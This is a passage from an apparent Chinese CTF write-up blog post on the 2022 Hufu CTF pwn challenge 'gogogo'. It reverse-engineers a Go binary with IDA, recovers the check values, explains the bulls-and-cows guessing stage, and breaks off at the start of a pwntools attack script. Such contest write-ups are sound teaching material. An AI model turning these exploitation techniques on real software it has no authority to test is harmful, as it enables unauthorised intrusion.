<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="gogogo123➜  [&#x2F;home&#x2F;ywhkkx&#x2F;桌面] .&#x2F;gogogo       LET&amp;#x27;S BEGIN TO PLAY A GUESS GAME IN HFCTF!PLEASE INPUT A NUMBER: 12345678gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linke">
<meta property="og:type" content="article">
<meta property="og:title" content="虎符CTF2022">
<meta property="og:url" content="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="gogogo123➜  [&#x2F;home&#x2F;ywhkkx&#x2F;桌面] .&#x2F;gogogo       LET&amp;#x27;S BEGIN TO PLAY A GUESS GAME IN HFCTF!PLEASE INPUT A NUMBER: 12345678gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linke">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/1648043452770.png">
<meta property="article:published_time" content="2022-03-25T11:20:54.000Z">
<meta property="article:modified_time" content="2022-07-21T03:11:39.635Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="canary">
<meta property="article:tag" content="fmt">
<meta property="article:tag" content="golang pwn">
<meta property="article:tag" content="VMP pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/1648043452770.png">

<link rel="canonical" href="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>虎符CTF2022 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/25/%E8%99%8E%E7%AC%A6CTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          虎符CTF2022
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-25 19:20:54" itemprop="dateCreated datePublished" datetime="2022-03-25T19:20:54+08:00">2022-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-21 11:11:39" itemprop="dateModified" datetime="2022-07-21T11:11:39+08:00">2022-07-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>57k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>52 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./gogogo       </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gogogo: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, Go BuildID=OPIhFHMrY<span class="number">-7U</span>FXwK1kut/ps8Q_hGCHEf-Am9x5tdv/<span class="number">3</span>tThvdTnrIvrW8jtkHHX/yCVwqchmGGNZd485XtOR, stripped</span><br><span class="line"> </span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/gogogo&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>输入两个数字，进入主体程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br></pre></td></tr></table></figure>
<p>golang逆向出来真的难看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-38h] [rbp-98h]</span></span><br><span class="line">  _QWORD *v9; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  _QWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v10 &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v10[<span class="number">0</span>] = &amp;unk_49D7C0;</span><br><span class="line">  v10[<span class="number">1</span>] = &amp;off_4CFBB0;</span><br><span class="line">  fmt_Fprintln(v2);</span><br><span class="line">  fmt_Fprintln(v3);</span><br><span class="line">  runtime_newobject(v4);</span><br><span class="line">  v9 = v1;</span><br><span class="line">  fmt_Fscanf(v5);</span><br><span class="line">  <span class="keyword">if</span> ( *v9 == <span class="number">305419896LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln(v6);</span><br><span class="line">    runtime_makeslice(v7);</span><br><span class="line">    bufio___ptr_Reader__Read(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln(v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用插件初步处理后：（我用的是 IDAGolangHelper）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  _QWORD v3[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int64)v3 &lt;= *(_QWORD *)(v0 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v3[<span class="number">0</span>] = &amp;unk_49D7C0;</span><br><span class="line">  v3[<span class="number">1</span>] = &amp;off_4CFBB0;</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  runtime_newobject();</span><br><span class="line">    <span class="comment">/* Go 语言的标准库函数runtime.newobject()用于在heap上的内存分配和代理runtime.mallocgc */</span></span><br><span class="line">  v2 = v1;</span><br><span class="line">  fmt_Fscanf();</span><br><span class="line">  <span class="keyword">if</span> ( *v2 == <span class="number">305419896LL</span> )</span><br><span class="line">      <span class="comment">/* fmt_Fscanf()应该是输入语句,v2应该是输入的内容 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln();</span><br><span class="line">    runtime_makeslice();</span><br><span class="line">    bufio__ptr_Reader_Read();</span><br><span class="line">      <span class="comment">/* Reset丢弃缓冲中的数据，清除任何错误，将b重设为其下层从r读取数据 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fmt_Fprintln();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序提示我们输入一个数字，那么就输入“305419896”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">305419896</span></span><br><span class="line">OKAY YOU CAN LEAVE YOUR NAME AND BYE~</span><br></pre></td></tr></table></figure>
<p>好像失败了，这是这么回事（不输入这个数字会直接退出）另外我还发现：</p>
<ul>
<li>在 <code>main_main</code> 中下的断点丝毫不起作用</li>
<li>IDA的伪代码中有许多 <code>fmt_Fprintf()</code> ，每个只输出一个字符</li>
<li>其中 <code>fmt_Fprintln()</code> 表示输出带有“\n”的字符串</li>
</ul>
<p>golang 会通过 <code>runtime·newproc</code> 创建 <code>runtime.main</code> 协程，然后在 <code>runtime.main</code> 里会启动 <code>main.main</code> 函数，这个就是我们平时写的那个 main 函数了 </p>
<p>因为我对 golang 的底层不熟悉，所以我选择在 <code>runtime.main</code> 处打断点，一步一步分析程序的流程</p>
<ul>
<li>结果程序在 <code>math_init</code> 中不断循环，调试不了（IDA在一步步单步执行后，又回到了原点，目前不知道为什么）</li>
<li>最后通过下断点的方式跳出了循环，并且成功发现了目标数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == <span class="number">1717986918</span> )</span><br><span class="line">&#123;</span><br><span class="line">  bytes_In(); <span class="comment">/* 盲猜是输入 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v2 != <span class="number">1416925456</span> )</span><br><span class="line">&#123;</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  fmt_Fprintf();</span><br><span class="line">  v139 = &amp;unk_49D7C0;</span><br><span class="line">  v140 = &amp;off_4CFC10;</span><br><span class="line">  fmt_Fprintln();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>第一次输入：1717986918</li>
<li>第二次输入：1416925456</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./gogogo        </span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">1717986918</span></span><br><span class="line">LET<span class="number">&#x27;</span>S BEGIN TO PLAY A GUESS GAME IN HFCTF!</span><br><span class="line">PLEASE INPUT A NUMBER:</span><br><span class="line"><span class="number">1416925456</span></span><br><span class="line">BYE~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS <span class="comment">// 7次机会</span></span><br></pre></td></tr></table></figure>
<p>进入下一阶段了，通过调试获取目标代码，下面一段大概就是了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v138 = &amp;unk_49D7C0;</span><br><span class="line">v139 = &amp;unk_4CFC00;</span><br><span class="line">v3 = qword_551500;</span><br><span class="line">fmt_Fprintln();</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v150 = time_Now();</span><br><span class="line">    <span class="comment">/* 获取当前时间 */</span></span><br><span class="line">  v151 = v3;</span><br><span class="line">  v152 = v4;</span><br><span class="line">  math_rand__ptr_Rand_Seed();</span><br><span class="line">    <span class="comment">/* 获取随机数种子 */</span></span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">    <span class="comment">/* 输出随机数 */</span></span><br><span class="line">  v67[<span class="number">0</span>] = v5;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  <span class="keyword">while</span> ( v67[<span class="number">0</span>] == v6 )</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">  v74 = v6;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  v8 = v67[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = v74; v8 == v7 || v7 == i; i = v74 )</span><br><span class="line">  &#123;</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">    v8 = v67[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v73 = v7;</span><br><span class="line">  math_rand__ptr_Rand_Intn();</span><br><span class="line">  v11 = v67[<span class="number">0</span>];</span><br><span class="line">  v12 = v74;</span><br><span class="line">  <span class="keyword">for</span> ( j = v73; v11 == v10 || v10 == v12 || v10 == j; j = v73 )</span><br><span class="line">  &#123;</span><br><span class="line">    math_rand__ptr_Rand_Intn();</span><br><span class="line">    v11 = v67[<span class="number">0</span>];</span><br><span class="line">    v12 = v74;</span><br><span class="line">  &#125;</span><br><span class="line">  v71 = v10;</span><br></pre></td></tr></table></figure>
<p>很难看，但大体上了解了：这是通过“系统时间”来获取随机数，最后的输入在这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fmt_Fscanf();</span><br><span class="line">v26 = *v85;</span><br><span class="line"><span class="keyword">if</span> ( v67[<span class="number">0</span>] != *v85 ) <span class="comment">/* 盲猜v67[0]为随机数,v85就是输入值 */</span></span><br><span class="line">&#123;</span><br><span class="line">  v29 = v73;</span><br><span class="line">  v32 = v82;</span><br><span class="line">  v31 = v83;</span><br><span class="line">  v27 = v74;</span><br><span class="line">  v28 = v84;</span><br><span class="line">  v30 = v71;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_44:</span><br><span class="line">      v33 = *v28;</span><br><span class="line">      v34 = *v31;</span><br><span class="line">      v35 = *v32;</span><br><span class="line">      v36 = v67[<span class="number">0</span>] == *v28 || v67[<span class="number">0</span>] == v34 || v67[<span class="number">0</span>] == v35;</span><br><span class="line">      <span class="keyword">if</span> ( v27 == v26 || v27 == v34 || v27 == v35 )</span><br><span class="line">        ++v36;</span><br><span class="line">      <span class="keyword">if</span> ( v29 == v33 || v29 == v26 || v29 == v35 )</span><br><span class="line">        ++v36;</span><br><span class="line">      <span class="keyword">if</span> ( v30 == v26 || v30 == v34 || v30 == v33 )</span><br><span class="line">        ++v36;</span><br><span class="line">      v67[<span class="number">1</span>] = v36;</span><br><span class="line">      runtime_convT64(v64);</span><br><span class="line">      v80 = v24;</span><br><span class="line">      runtime_convT64(v65);</span><br><span class="line">      v153 = <span class="string">&quot;\b&quot;</span>;</span><br><span class="line">      v154 = v80;</span><br><span class="line">      v155 = <span class="string">&quot;\b&quot;</span>;</span><br><span class="line">      v156 = v25;</span><br><span class="line">      fmt_Fprintf();</span><br><span class="line">      v124 = &amp;unk_49D7C0;</span><br><span class="line">      v125 = &amp;unk_4CFC00;</span><br><span class="line">      v3 = qword_551500;</span><br><span class="line">      fmt_Fprintln();</span><br><span class="line">      v18 = v72 + <span class="number">1</span>;</span><br><span class="line">      v17 = v82;</span><br></pre></td></tr></table></figure>
<p>单步调试，没有看明白它的代码，但是它给出了提示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">6</span></span><br><span class="line"><span class="number">0</span>A1B</span><br><span class="line">$ <span class="number">999</span></span><br><span class="line"><span class="number">0</span>A0B</span><br></pre></td></tr></table></figure>
<p>0A1B？0A0B？盲猜这是程序的某种提示，组里和我同期的pwn手发现这是“1A2B游戏”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">你和对手分别选定一个四位数，各位数字不要重复</span><br><span class="line">游戏开始后，由双方分别猜对方所选定的四位数，猜测的结果将会列在自己的猜测历史列表，并以A和B来表示结果</span><br><span class="line">A代表猜测的数字中，数字相同且位置也正确的个数</span><br><span class="line">B代表猜测的数字中，数字相同但位置不一样的个数</span><br><span class="line">举例来说，如果对方的数字为<span class="number">1234</span>，且你猜的数字为<span class="number">5283</span>，其中<span class="number">2</span>被猜到且位置正确，<span class="number">3</span>也被猜到但位置不对，所以结果会出现<span class="number">1</span>A1B</span><br><span class="line">比赛由先完整猜出对方数字的人获得胜利（也就是先得到<span class="number">4</span>A的玩家）</span><br></pre></td></tr></table></figure>
<p>在我的后续尝试中发现，输入的数字需要加空格：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">1234</span></span><br><span class="line"><span class="number">1</span>A1B</span><br><span class="line">$ <span class="number">5678</span></span><br><span class="line"><span class="number">1</span>A1B <span class="comment">/* 很明显不符合规则 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NOW WE BEGIN A BULLS AND COWS GAME</span><br><span class="line">YOU HAVE SEVEN CHANCES TO GUESS</span><br><span class="line">$ <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span>A0B</span><br><span class="line">$ <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span>A2B <span class="comment">/* 现在差不多了 */</span></span><br></pre></td></tr></table></figure>
<p>接下来就是算法的问题了，我想通过爆破所有可能性来“猜中”随机数，但是在这个过程中遇到了许多BUG，花费了我很多时间才成功，下面就是攻击脚本：（有点丑陋，但很直观）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="number">0</span></span><br><span class="line">B=<span class="number">0</span></span><br><span class="line">C=<span class="number">0</span></span><br><span class="line">D=<span class="number">0</span></span><br><span class="line">E=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	E=E+<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	payload=<span 